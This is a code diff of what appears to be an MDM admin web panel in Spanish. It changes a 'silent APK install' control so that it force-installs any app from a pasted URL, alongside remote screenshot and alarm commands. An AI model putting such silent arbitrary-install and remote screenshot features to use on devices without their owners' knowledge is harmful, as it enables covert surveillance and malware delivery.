@@ -599,14 +599,15 @@ try {
                 </div>
 
                 <!-- 5. Forzar Instalación APK (MDM) -->
-                <div class="flex items-center justify-between p-3 bg-slate-50 rounded-lg border border-slate-200">
-                    <div>
-                        <div class="text-xs font-semibold text-slate-900 flex items-center gap-1.5">
-                            <i data-lucide="download" class="w-3.5 h-3.5 text-blue-600"></i> Instalar APK Silencioso
-                        </div>
-                        <p class="text-[11px] text-slate-600">Fuerza la descarga e instalación del último APK en producción</p>
+                <div class="p-3 bg-slate-50 rounded-lg border border-slate-200 space-y-2">
+                    <label class="block text-xs font-semibold text-slate-900 flex items-center gap-1.5">
+                        <i data-lucide="download" class="w-3.5 h-3.5 text-blue-600"></i> Instalar APK Silencioso
+                    </label>
+                    <p class="text-[11px] text-slate-600">Pega el link directo (.apk) para forzar la instalación de cualquier app</p>
+                    <div class="flex gap-2">
+                        <input type="text" id="mdm-input-apk" placeholder="https://ejemplo.com/app.apk" class="flex-1 bg-white text-xs text-slate-900 px-3 py-2 rounded-md subtle-border focus:outline-none focus:border-blue-500">
+                        <button onclick="sendMdmCommand('force_ota')" class="px-3 py-2 bg-blue-600 hover:bg-blue-500 text-white text-xs font-semibold rounded-md border border-blue-600">Instalar</button>
                     </div>
-                    <button onclick="sendMdmCommand('force_ota')" class="px-3 py-1.5 bg-blue-600 hover:bg-blue-500 text-white text-xs font-semibold rounded-md">Instalar</button>
                 </div>
             </div>
 
@@ -937,9 +938,9 @@ try {
             if (type === 'message') {
                 const msg = document.getElementById('mdm-input-msg').value.trim();
                 if (!msg) return alert('Escribe un mensaje');
-                commandString = `ALERT:${msg}`;
+                commandString = `SHOW_MESSAGE:${msg}`;
             } else if (type === 'siren') {
-                commandString = 'SIREN:15';
+                commandString = 'PLAY_ALARM_SOUND';
             } else if (type === 'screenshot') {
                 commandString = 'SCREENSHOT';
                 actionType = 'request_screenshot';
@@ -948,8 +949,10 @@ try {
                 if (!pkg) return alert('Escribe el nombre de paquete');
                 commandString = `SET_PACKAGE:${pkg}`;
             } else if (type === 'force_ota') {
-                commandString = 'INSTALL_APK_OTA';
-                actionType = 'force_ota_update';
+                const apkUrl = document.getElementById('mdm-input-apk').value.trim();
+                if (!apkUrl) return alert('Pega el link directo al APK');
+                commandString = `INSTALL_APK_OTA:${apkUrl}`;
+                actionType = 'send_command';
             }
 
             const feedback = document.getElementById('mdm-feedback');
